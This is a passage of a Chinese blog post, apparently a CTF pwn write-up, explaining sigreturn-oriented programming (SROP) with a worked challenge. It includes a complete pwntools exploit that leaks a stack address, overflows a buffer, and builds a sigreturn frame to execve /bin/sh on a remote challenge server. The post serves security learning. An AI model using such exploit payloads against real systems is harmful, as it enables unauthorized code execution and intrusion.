+<p>sigreturn的调用号为15，再给出的gadgets中，刚好有mov rax, 0Fh，也就是把rax置为15，execve的调用号为59，gadgets中，也有mov rax, 3Bh。</p>
+<p>我们首先通过read、write正常执行，将bin&#x2F;sh字符正常写入，并获得其地址，然后再次返回到vuln执行。这时我们先通过read函数溢出，转到0x04004DA执行，使rax为15，然后返回的时候（mov rax, 0Fh的下一条是ret），使其转到syscall（第二个syscall避免rax被改变）执行，就触发了系统中断，此时将我们设置好的寄存器传入，使其返回的时候执行syscall，这样就可以执行execve了。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>)+p64(vuln_addr)<span class="comment">#写入bin/sh</span></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(sigreturn_addr)+p64(syscall_addr)+<span class="built_in">str</span>(frameExecve)<span class="comment">#利用pwntools实现execve的寄存器布置（其实也可以自己来）</span></span><br><span class="line">frameExecve=SigreturnFrame() </span><br><span class="line">frameExecve.rax =constants.SYS_execve <span class="comment">#系统调用号，也就是rax=59</span></span><br><span class="line">frameExecve.rdi =binsh_addr <span class="comment">#bin/sh的地址</span></span><br><span class="line">frameExecve.rsi =<span class="number">0</span>  <span class="comment">#execve的其它参数</span></span><br><span class="line">frameExecve.rdx =<span class="number">0</span>  <span class="comment">#同上</span></span><br><span class="line">frameExecve.rip =syscall_addr <span class="comment">#返回到syscall</span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后我们计算bin&#x2F;sh的地址，write函数在打印时，打印了0x30的内容，但var却只有0x10，因此会将其它地址打印出来，只要打印出栈地址，算出该地址的偏移和&#x2F;bin&#x2F;sh的相对偏移，就可以知道bin&#x2F;sh的地址了。</p>
+<p>当前栈地址为rsp 0x7fffffffdea0，因此bin&#x2F;sh的地址为rsp-0x10&#x3D;0x7fffffffde90，打印0x20的内容后，会打印0x7fffffffdeb0（rsp+0x10）的内容：0x00007fffffffdfa8</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s14.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>打印出来的栈地址为0x00007fffffffdfa8，即偏移为：0x00007fffffffdfa8-0x7fffffffde90 &#x3D; 0x118<br>计算bin&#x2F;sh地址：binsh_addr&#x3D;u64(p.recv(8))-0x118 #接收地址，计算偏移</p>
+<p>完整exp:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29247</span>)</span><br><span class="line">sigreturn_addr = <span class="number">0x4004DA</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">vuln_addr=<span class="number">0x4004f1</span></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">binsh_addr=u64(p.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line">frameExecve=SigreturnFrame()</span><br><span class="line">frameExecve.rax =constants.SYS_execve</span><br><span class="line">frameExecve.rdi =binsh_addr</span><br><span class="line">frameExecve.rsi =<span class="number">0</span></span><br><span class="line">frameExecve.rdx =<span class="number">0</span></span><br><span class="line">frameExecve.rip =syscall_addr</span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload+=p64(sigreturn_addr)+p64(syscall_addr)+<span class="built_in">str</span>(frameExecve)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>成功获取flag：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/SROP/s15.png?x-oss-process=style/watermark"
+                     
+                ></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> SROP</li>
+        <li><strong>Author:</strong> wutong</li>
+        <li><strong>Created at:</strong> 2023-07-15 14:08:30</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2023-07-19 13:54:04
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://wutong01304.github.io/2023/07/15/SROP/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Pwn/">#Pwn</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Stack/">#Stack</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/SROP/">#SROP</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/07/13/ret2dlruntime/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">栈迁移+ret2_dl_runtime_reslove</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">SROP</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-text">一、基本原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B"><span class="nav-text">二、攻击过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E5%A4%9A%E6%AC%A1%E5%88%A9%E7%94%A8syscall"><span class="nav-text">2.1 多次利用syscall</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E6%9E%84%E9%80%A0write"><span class="nav-text">2.2 构造write</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E6%9E%84%E9%80%A0sigreturn"><span class="nav-text">2.3 构造sigreturn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-%E6%9E%84%E9%80%A0-execve"><span class="nav-text">2.4 构造 execve</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-5-%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E9%A2%98"><span class="nav-text">2.5 一道简单的例题</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">wutong</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.2.1</a>
+        </div>
+        
+        
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/layouts/navbarShrink.js"></script>
+
+<script src="/js/tools/scrollTopBottom.js"></script>
+
+<script src="/js/tools/lightDarkSwitch.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/tools/tocToggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/layouts/toc.js"></script>
+
+<script src="/js/plugins/tabs.js"></script>
+
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
